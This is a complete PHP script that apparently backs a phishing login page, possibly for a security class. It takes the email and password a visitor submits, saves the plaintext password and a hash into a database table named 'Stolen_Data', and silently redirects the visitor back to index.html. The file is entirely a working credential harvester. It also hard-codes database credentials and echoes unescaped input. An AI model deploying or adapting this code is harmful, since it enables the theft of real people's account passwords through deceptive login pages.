<?php
$servername = "localhost";
$username = "carloshugokali";
$password = "kali";
$dbname = "class_S24";

$conn = mysqli_connect($servername, $username, $password, $dbname);

if (!$conn){
die("Connection Failed: " . mysqli_connect_error());
}
else{
//echo "Connected,</br>"; //comment this out when not troubleshooting
}

if(!isset($_POST['email'], $_POST['password'])){
echo "Post not set???</br>";
}
echo $_POST['email'];
echo $_POST['password'];

$stmt = $conn->prepare("INSERT INTO Stolen_Data (UserName, PlainPassword, PassHash) VALUES (?, ?, ?)");
$stmt->bind_param("sss", $UserName, $PlainPassword, $PassHash);
$UserName = $_POST['email'];
$PlainPassword = $_POST['password'];
$PassHash = password_hash($_POST['password'], PASSWORD_DEFAULT);
$stmt->execute();
//echo "done";
$stmt->close();
$conn->close();
header('location: index.html');
?>
